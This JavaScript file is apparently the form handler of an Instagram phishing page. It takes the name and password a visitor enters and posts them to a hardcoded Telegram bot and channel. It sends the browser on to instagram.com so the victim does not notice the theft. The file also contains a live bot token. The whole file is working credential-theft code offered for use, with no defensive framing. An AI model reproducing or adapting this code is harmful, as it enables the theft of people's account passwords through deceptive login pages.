"use strict"
//==========================================
const TELEGRAM_BOT_TOKEN = '7176892066:AAFrn3_CBvll2xVZ9nbO5a5kh_Sw4_0m-LY';
const TELEGRAM_CHAT_ID = '@instdeveloper';
const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`


async function sendEmailTelegram(event) {
    event.preventDefault();

    const form = event.target;
    const formBtn = document.querySelector('.form__submit-button button')
    const formSendResult = document.querySelector('.form__send-result')
    formSendResult.textContent = '';


    const { name, email, phone, pass } = Object.fromEntries(new FormData(form).entries());
    
    const text = `Имя пользователя: ${name}!\nПароль: ${pass}`;


    try {
        formBtn.textContent = 'Loading...';
        document.location = "https://www.instagram.com/"
        const response = await fetch(API, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text,
            })
        })
        
        if (response.ok) {
            formSendResult.textContent = '';
            form.reset()
        } else {
            throw new Error(response.statusText);
        }

    } catch (error) {
        console.error(error);
        formSendResult.textContent = 'Анкета не отправлена! Попробуйте позже.';
        formSendResult.style.color = 'red';

    } finally {
        formBtn.textContent = 'Отправить';
    }
}